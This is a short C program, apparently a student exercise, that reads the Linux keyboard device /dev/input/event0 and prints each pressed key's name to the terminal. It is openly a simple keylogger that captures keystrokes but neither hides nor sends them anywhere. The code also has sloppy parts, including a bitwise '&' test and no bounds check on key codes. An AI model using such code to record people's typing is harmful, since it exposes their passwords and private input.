/*																*
 * Practica 14: Keylogger(sencillo)								*
 * Muestra en terminal las teclas que se presionan en cualquier	*
 * momento.														*
 * 																*
 * Autor: Diana Tadeo											*
 */
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <linux/input-event-codes.h>

/* Arreglo con algunas de las teclas que se permiten de entrada de acuerdo
 * al teclado y como se encuentra configurado el acrhivo "/usr/include/linux/input-event-codes.h"
 * donde su posicion en el arreglo es el codigo de dicho archivo.
 * Solo llega hasta el 120, pero se puede seguir extendiendo..
 * 
 * ej.
 * en input-event-codes.h 
 * #define KEY_SPACE		57
 * 
 * teclas[57]= "SPACE"
 */
char * teclas[]={"RESERVED","ESC","1","2","3","4","5","6", //[0]-[7]
				"7","8","9","0","MINUS","EQUAL","BACKSPACE", //[8]-[14]
				"TAB","Q","W","E","R","T","Y","U","I","O",//[15]-[24]
				"P","LEFTBRACE","RIGHTBRACE","ENTER","LEFTCTRL",//[25]-[29]
				"A","S","D","F","G","H","J","K","L","SEMICOLON",//[30]-[39]
				"APOSTROPHE","GRAVE","LEFTSHIFT","BACKSLASH",//[40]-[43]
				"Z","X","C","V","B","N","M","COMMA","DOT",//[44]-[52]
				"SLASH","RIGHTSHIFT","KPASTERISK","LEFTALT",//[53]-[56]
				"SPACE","CAPSLOCK","F1","F2","F3","F4","F5",//[57]-[63]
				"F6","F7","F8","F9","F10","NUMLOCK","SCROLLLOCK",//[64]-[70]
				"KP7","KP8","KP9","KPMINUS","KP4","KP5","KP6",//[71]-[77]
				"KPPLUS","KP1","KP2","KP3","KP0","KPDOT",//[78]-[83]
				"","ZENKAKUHANKAKU","102ND","F11","F12","RO",//[84]-[89]
				"KATAKANA","HIRAGANA","HENKAN","KATAKANAHIRAGANA",//[90]-[93]
				"MUHENKAN","KPJPCOMMA","KEY_KPENTER","RIGHTCTRL",//[94]-[97]
				"KPSLASH","SYSRQ","RIGHTALT","LINEFEED","HOME",//[98]-[102]
				"UP","PAGEUP","LEFT","RIGHT","END","DOWN",//[103]-[108]
				"PAGEDOWN","INSERT","DELETE","MACRO","MUTE",//[109]-[113]
				"VOLUMEDOWN","VOLUMEUP","POWER","KPEQUAL",//[114]-[117]
				"KPPLUSMINUS","PAUSE","SCALE"};//[118]-[120]
int main(){
	int eventofd;
	struct input_event ev;
	size_t tam=sizeof(int);
	char *arch="/dev/input/event0";//es la entrada del teclado
	/*Abrimos el archivo que lee la entrada del teclado*/
	eventofd=open(arch,O_RDONLY,S_IRUSR,S_IWUSR);
	while(1){
		/*Se lee la entrada*/
		read(eventofd,&ev,sizeof(struct input_event));
		if(ev.type==1 & ev.value==1)//type==1 es cuando se hace algo con una tecla, value==1 es cuando se presiona
			printf("%s\n",teclas[ev.code]);//Se imprime el valor de acuerdo al arreglo
	}
	close(eventofd);
}


